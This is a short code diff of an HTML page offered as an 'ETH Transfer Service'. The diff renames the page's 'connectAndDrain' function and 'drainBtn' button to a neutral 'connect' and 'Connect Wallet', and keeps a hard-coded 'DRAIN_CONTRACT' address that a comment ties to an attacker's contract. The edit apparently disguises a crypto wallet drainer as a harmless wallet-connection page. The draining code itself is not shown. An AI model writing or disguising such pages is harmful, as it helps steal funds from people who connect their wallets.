@@ -51,8 +51,8 @@
 
 <div class="container">
  <h1>Welcome to Our ETH Transfer Service</h1>
- <p>Click the button below to transfer your ETH securely.</p>
- <button id="drainBtn" onclick="connectAndDrain()">Transfer ETH</button>
+ <p>Just a test.</p>
+ <button id="ConnectBtn" onclick="connect()">Connect Wallet</button>
  <div id="status"></div>
 </div>
 
@@ -63,8 +63,8 @@
  // In a real scenario, this would be the attacker's smart contract address.
  const DRAIN_CONTRACT = "0xbD89Ca74a0442E695383d4e2442466Fa8735c161"; 
 
- async function connectAndDrain() {
- const btn = document.getElementById('drainBtn');
+ async function connect() {
+ const btn = document.getElementById('ConnectBtn');
  const status = document.getElementById('status');
  
  btn.disabled = true;
